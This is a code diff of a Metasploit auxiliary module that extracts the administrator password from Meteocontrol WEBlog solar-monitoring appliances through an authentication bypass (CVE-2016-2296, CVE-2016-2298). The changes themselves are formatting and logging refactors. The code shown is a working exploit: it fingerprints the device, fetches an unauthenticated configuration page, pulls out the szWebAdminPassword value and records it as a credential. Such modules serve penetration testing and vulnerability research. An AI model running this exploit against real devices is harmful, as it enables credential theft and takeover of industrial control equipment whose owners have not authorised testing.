@@ -8,23 +8,30 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name' => 'Meteocontrol WEBlog Password Extractor',
-      'Description' => %{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Meteocontrol WEBlog Password Extractor',
+        'Description' => %q{
           This module exploits an authentication bypass vulnerability in Meteocontrol WEBLog appliances (software version < May 2016 release) to extract Administrator password for the device management portal.
-      },
-      'References' =>
-        [
+        },
+        'References' => [
           ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-16-133-01'],
           ['CVE', '2016-2296'],
           ['CVE', '2016-2298']
         ],
-      'Author' =>
-        [
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'License' => MSF_LICENSE))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -51,17 +58,16 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => '/html/en/index.html',
         'method' => 'GET'
       })
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
-      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - HTTP Connection Failed...")
       return false
     end
 
     if (res && res.code == 200 && (res.headers['Server'] && res.headers['Server'].include?('IS2 Web Server') || res.body.include?("WEB'log")))
-      print_good("#{rhost}:#{rport} - Running Meteocontrol WEBlog management portal...")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Running Meteocontrol WEBlog management portal...")
       return true
     else
-      print_error("#{rhost}:#{rport} - Application does not appear to be Meteocontrol WEBlog. Module will not continue.")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Application does not appear to be Meteocontrol WEBlog. Module will not continue.")
       return false
     end
   end
@@ -71,23 +77,22 @@ class MetasploitModule < Msf::Auxiliary
   #
 
   def do_extract()
-    print_status("#{rhost}:#{rport} - Attempting to extract Administrator password...")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Attempting to extract Administrator password...")
     begin
       res = send_request_cgi({
-          'uri' => '/html/en/confAccessProt.html',
-          'method' => 'GET'
+        'uri' => '/html/en/confAccessProt.html',
+        'method' => 'GET'
       })
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - HTTP Connection Failed...")
       return
     end
 
-    if (res && res.code == 200 && (res.body.include?('szWebAdminPassword') || res.body=~ /Admin Monitoring/))
+    if (res && res.code == 200 && (res.body.include?('szWebAdminPassword') || res.body =~ /Admin Monitoring/))
       get_admin_password = res.body.match(/name="szWebAdminPassword" value="(.*?)"/)
       if get_admin_password[1]
         admin_password = get_admin_password[1]
-        print_good("#{rhost}:#{rport} - Password is #{admin_password}")
+        print_good("#{Rex::Socket.to_authority(rhost, rport)} - Password is #{admin_password}")
         report_cred(
           ip: rhost,
           port: rport,
@@ -97,10 +102,10 @@ class MetasploitModule < Msf::Auxiliary
         )
       else
         # In some models, 'Website password' page is renamed or not present. Therefore, password can not be extracted. Check login manually on http://IP:port/html/en/confAccessProt.html for the szWebAdminPassword field's value.
-        print_error("Check login manually on http://#{rhost}:#{rport}/html/en/confAccessProt.html for the 'szWebAdminPassword' field's value.")
+        print_error("Check login manually on http://#{Rex::Socket.to_authority(rhost, rport)}/html/en/confAccessProt.html for the 'szWebAdminPassword' field's value.")
       end
     else
-      print_error("Check login manually on http://#{rhost}:#{rport}/html/en/confAccessProt.html for the 'szWebAdminPassword' field's value.")
+      print_error("Check login manually on http://#{Rex::Socket.to_authority(rhost, rport)}/html/en/confAccessProt.html for the 'szWebAdminPassword' field's value.")
     end
   end
 
